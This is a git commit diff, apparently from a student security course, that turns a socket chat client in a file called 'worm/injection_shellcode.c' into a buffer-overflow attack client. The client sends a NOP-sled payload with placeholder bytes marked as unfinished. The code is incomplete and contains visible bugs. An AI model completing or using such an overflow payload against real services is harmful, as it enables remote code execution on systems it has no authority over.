a0b483ecd7d4145ae554c85e2e7c3ffa9c9aaf64
osboxes.org <drezet@etud.insa-toulouse.fr>
2023-02-21 14:49:56 +0100

    eauveur_phlauw

--- worm/injection_shellcode.c
+++ worm/injection_shellcode.c
@@ -8,63 +8,56 @@
 
 // Voir fonction strcat pour concaténer des chars (string.h)
 
-void func(int sockfd)
+void func(int sockfd, char *pay)
 {
-	char buff[MAX];
+	/*char buff[MAX];
 	int n;
-	for (;;) {
-		bzero(buff, sizeof(buff));
-		printf("Enter the string : ");
-		n = 0;
-		while ((buff[n++] = getchar()) != '\n')
-			;
-		write(sockfd, buff, sizeof(buff));
-		bzero(buff, sizeof(buff));
-		read(sockfd, buff, sizeof(buff));
-		printf("From Server : %s", buff);
-		if ((strncmp(buff, "exit", 4)) == 0) {
-			printf("Client Exit...\n");
-			break;
-		}
-	}
+	bzero(buff, sizeof(buff));
+	n = 0;
+	while ((buff[n++] = getchar()) != '\n')
+		;*/
+	printf("Overflow en cours...");
+	write(sockfd, pay, sizeof(pay));
+	//bzero(buff, sizeof(buff));
+	read(sockfd, pay, sizeof(pay));
+	printf("From Server : %s", pay);
+
+	/*if ((strncmp(buff, "exit", 4)) == 0) {
+		printf("Client Exit...\n");
+		break;
+	}*/
 }
 
-
-unsigned long get_sp(void) {
+/*unsigned long get_sp(void) {
 __asm__("movq %rsp,%rax");
 }
+long l=get_sp();
+printf("Ox%lu\n", l);
+*/
 
 
 
 int main (int argc, char *argv[]){
 
-	long l=get_sp();
+	//int sockfd = (int)argv[1];
+	int sockfd = 1;
 
-    int a = 0;
-    int b = 2;	
-
-	printf("Ox%lu\n", l);
-
-    if (argc != 1) {
+    if (argc != 2) {
         printf("Erreur: la fonction %s ne requiert aucun parametres\n", argv[0]);
         return 1;
     }
 	
-	/*
-    
     // Ecriture en dur du shellcode : 
     // NOP *40(etc 1 octet chaque) + shellcode (taille à définir POUR TAILLE BOF) 
     // + "A" *4(1 octet chaque) + @retour_dans_nop (== @relatif A CHERCHER GDB BASE PILE - [size(shellcode) + 4* A + moitié Nop])
-    char shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x42\x41\x41\x41\x41\x40"; // A COMPLETER
+    char payload[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x42\x41\x41\x41\x41\x40"; // A COMPLETER
 
     // COMMENT @retour = @base pile + taille instruction ENTIERE !!!
 
+    // Envoi de la payload
+	func(sockfd, payload);
 
-    // function for chat
-	// func(sockfd);
-
-
-    printf("OK\n");
-    printf("%s\n", shellcode);
-    return 0;*/
+    printf("%s\n", payload);
+	printf("OK\n");
+    return 0;
 }
